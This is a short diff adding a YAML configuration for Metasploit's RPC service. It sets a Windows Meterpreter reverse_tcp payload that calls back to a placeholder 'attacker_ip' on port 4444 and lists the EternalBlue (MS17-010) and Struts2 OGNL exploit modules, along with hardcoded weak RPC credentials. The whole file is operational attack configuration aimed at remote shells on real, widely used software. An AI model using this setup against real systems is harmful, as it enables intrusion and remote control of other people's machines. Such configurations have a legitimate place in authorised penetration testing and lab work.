@@ -1,0 +1,12 @@
+metasploit:
+  host: "localhost"
+  port: 55553
+  username: "msfuser"
+  password: "password"
+  payload:
+    type: "windows/meterpreter/reverse_tcp"
+    lhost: "attacker_ip"
+    lport: 4444
+  exploits:
+    - "exploit/windows/smb/ms17_010_eternalblue"
+    - "exploit/multi/http/struts2_content_type_ognl"
